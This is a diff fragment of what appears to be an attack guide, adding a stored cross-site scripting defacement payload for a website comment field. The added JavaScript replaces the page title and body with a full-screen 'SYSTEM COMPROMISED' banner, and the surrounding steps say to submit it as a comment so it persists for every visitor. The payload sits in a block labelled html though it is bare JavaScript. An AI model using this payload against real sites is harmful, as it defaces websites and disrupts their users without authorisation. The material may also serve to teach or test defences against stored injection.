@@ -68,6 +68,26 @@ Goal: Change the visual appearance of the website for all users.
   <h1>HACKED BY ANONYMOUS</h1>
 </div>
 ```
+
+```html
+document.title='💀 HACKED BY ETHICAL PENTESTER 💀'; 
+document.body.innerHTML=`
+  <div style="position:fixed;top:0;left:0;width:100%;height:100%;
+              background:linear-gradient(45deg, black, red, black);
+              color:lime;display:flex;flex-direction:column;
+              align-items:center;justify-content:center;
+              font-family:Courier New,monospace;z-index:99999;
+              animation:pulse 1s infinite;">
+    <div style="font-size:4rem;text-shadow:0 0 20px lime;margin-bottom:20px;">
+      💀 SYSTEM COMPROMISED 💀
+    </div>
+    <div style="font-size:1.5rem;margin-bottom:20px;">
+      Website Telah Diretas!
+    </div>
+  </div>
+`;
+
+```
 1. Submit this payload in a comment.
 2. Refresh the page. The style persists because it's stored in the database.
 
